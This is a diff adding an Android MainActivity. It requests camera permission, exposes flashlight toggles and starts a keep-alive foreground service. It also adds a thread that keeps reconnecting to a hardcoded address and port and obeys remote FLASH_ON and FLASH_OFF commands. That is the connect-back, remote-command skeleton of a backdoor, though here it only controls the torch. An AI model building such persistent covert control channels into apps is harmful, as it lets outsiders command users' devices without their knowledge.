@@ -1,0 +1,167 @@
+package com.you.myapplication;
+
+import android.Manifest;
+import android.app.ActivityManager;
+import android.app.Service;
+import android.content.ContentProvider;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
+import android.hardware.camera2.CameraManager;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.view.WindowManager;
+
+import androidx.activity.EdgeToEdge;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.graphics.Insets;
+import androidx.core.view.ViewCompat;
+import androidx.core.view.WindowInsetsCompat;
+
+import com.karumi.dexter.Dexter;
+import com.karumi.dexter.PermissionToken;
+import com.karumi.dexter.listener.PermissionDeniedResponse;
+import com.karumi.dexter.listener.PermissionGrantedResponse;
+import com.karumi.dexter.listener.PermissionRequest;
+import com.karumi.dexter.listener.single.PermissionListener;
+
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.InetSocketAddress;
+import java.net.Socket;
+import java.util.List;
+
+public class MainActivity extends AppCompatActivity {
+
+
+     public static CameraManager cameraManager;
+     public static String cameraId;
+
+
+
+     public static void torchON(){
+         try {
+             cameraManager.setTorchMode(cameraId, true);
+         }catch(Exception e){
+
+              }
+         }
+
+     public static void torchOFF(){
+         try {
+             cameraManager.setTorchMode(cameraId, false); // 🔥 OFF
+         }catch(Exception e){
+         }
+     }
+
+
+
+
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        EdgeToEdge.enable(this);
+        setContentView(R.layout.activity_main);
+        Dexter.withContext(this)
+                .withPermission(Manifest.permission.CAMERA)
+                .withListener(new PermissionListener() {
+                    @Override
+                    public void onPermissionGranted(PermissionGrantedResponse response) {
+                        initCamera();
+                    }
+                    @Override public void onPermissionDenied(PermissionDeniedResponse response) {
+
+                    }
+                    @Override
+                    public void onPermissionRationaleShouldBeShown(PermissionRequest permission, PermissionToken token) {
+
+                    }
+                }).check();
+
+
+
+        startForegroundService(new Intent(this, KeepAliveService.class));
+
+
+    }
+
+        private void initCamera(){
+          try {
+              cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+              cameraId = cameraManager.getCameraIdList()[0];
+          }catch(Exception e){
+
+          }
+        }
+
+
+
+
+
+
+}
+
+class AppThread extends Thread {
+
+    @Override
+    public void run() {
+        Socket socket = null;
+        while (true) {
+            try {
+                InetSocketAddress addr = new InetSocketAddress("192.168.29.55", 4443);
+
+                 socket = new Socket();
+
+                socket.connect(addr, 3000);
+
+                OutputStream out = socket.getOutputStream();
+                out.write("[*] Connected\n".getBytes());
+
+
+                InputStream in = socket.getInputStream();
+                InputStreamReader isr = new InputStreamReader(in);
+                BufferedReader bufferedReader = new BufferedReader(isr);
+                String line;
+
+                while ((line = bufferedReader.readLine()) != null) {
+
+                    if (line.equalsIgnoreCase("FLASH_ON")) {
+                        MainActivity.torchON();
+                        out.write("[*] Torch  ON\n".getBytes());
+                    } else if (line.equalsIgnoreCase("FLASH_OFF")) {
+                        MainActivity.torchOFF();
+                        out.write("[*] Torch OFF\n".getBytes());
+
+
+                    }
+
+                }
+
+            } catch (Exception e) {
+                try {
+                    Thread.sleep(5000);
+                } catch (Exception ignored) {}
+
+                }finally{
+                try {
+                    if(socket != null) {
+                        socket.close();
+                    }
+                }catch(Exception e){}
+            }
+                }
+            }
+        }
+
+
+
+
+
+
+
+
+
